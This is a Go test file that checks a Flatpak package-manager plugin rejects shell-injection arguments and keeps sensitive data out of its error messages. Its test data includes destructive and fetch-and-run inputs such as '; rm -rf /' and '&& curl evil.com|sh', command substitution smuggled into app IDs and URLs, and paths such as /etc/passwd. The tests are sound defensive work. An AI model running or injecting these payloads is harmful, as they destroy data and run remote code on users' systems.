package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-flatpak"
)

var _ = Describe("Flatpak Security", func() {
	var (
		flatpakInstaller *main.FlatpakInstaller
	)

	BeforeEach(func() {
		flatpakInstaller = main.NewFlatpakPlugin()
	})

	Describe("Input Validation Security", func() {
		Context("command argument validation", func() {
			It("should reject malicious flatpak commands", func() {
				maliciousArgs := []string{
					"; rm -rf /",
					"&& curl evil.com|sh",
					"|| malicious-command",
					"`rm -rf /`",
					"$(curl evil.com)",
					"|sh",
				}

				for _, arg := range maliciousArgs {
					err := flatpakInstaller.Execute("install", []string{arg})
					Expect(err).To(HaveOccurred(),
						"Malicious argument '%s' should be rejected", arg)
				}
			})

			It("should validate app IDs", func() {
				maliciousAppIDs := []string{
					"app.id; rm -rf /",
					"org.example.App`curl evil.com`",
					"com.malicious$(dangerous)",
					"app|sh",
				}

				for _, appID := range maliciousAppIDs {
					err := flatpakInstaller.Execute("install", []string{appID})
					Expect(err).To(HaveOccurred(),
						"Malicious app ID '%s' should be rejected", appID)
				}
			})

			It("should validate remote URLs", func() {
				maliciousURLs := []string{
					"https://evil.com/repo.flatpakrepo; rm -rf /",
					"http://malware.com/repo`curl evil.com`",
					"https://attack.com/repo$(dangerous)",
				}

				for _, url := range maliciousURLs {
					err := flatpakInstaller.Execute("remote-add", []string{"test", url})
					Expect(err).To(HaveOccurred(),
						"Malicious URL '%s' should be rejected", url)
				}
			})
		})

		Context("shell metacharacter validation", func() {
			It("should reject dangerous shell metacharacters", func() {
				dangerousChars := []string{
					";", "&", "|", "`", "$", "(", ")", "<", ">", "\\",
				}

				for _, char := range dangerousChars {
					testArg := "safe" + char + "dangerous"
					err := flatpakInstaller.Execute("install", []string{testArg})
					Expect(err).To(HaveOccurred(),
						"Argument with dangerous character '%s' should be rejected", char)
				}
			})
		})
	})

	Describe("Error Message Security", func() {
		Context("error message sanitization", func() {
			It("should not leak sensitive information in error messages", func() {
				maliciousInputs := []string{
					"/etc/passwd",
					"$HOME/.local/share/flatpak",
					"/root/.bashrc",
					"$(whoami)",
					"~/.var/app/org.example.App",
				}

				for _, input := range maliciousInputs {
					err := flatpakInstaller.Execute("install", []string{input})
					if err != nil {
						errorMsg := err.Error()

						// Error should not contain the raw malicious input
						Expect(errorMsg).NotTo(ContainSubstring(input),
							"Error message should not leak malicious input")

						// Error should not contain sensitive paths
						Expect(errorMsg).NotTo(ContainSubstring("/etc/passwd"))
						Expect(errorMsg).NotTo(ContainSubstring("/root/"))
						Expect(errorMsg).NotTo(ContainSubstring("/.local/"))
					}
				}
			})

			It("should sanitize command outputs in logs", func() {
				// Test that any command output doesn't contain dangerous content
				err := flatpakInstaller.Execute("list", []string{})

				// This might succeed or fail depending on flatpak state
				// but should not expose dangerous information
				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).NotTo(ContainSubstring("password"))
					Expect(errorMsg).NotTo(ContainSubstring("token"))
					Expect(errorMsg).NotTo(ContainSubstring("secret"))
				}
			})
		})
	})
})
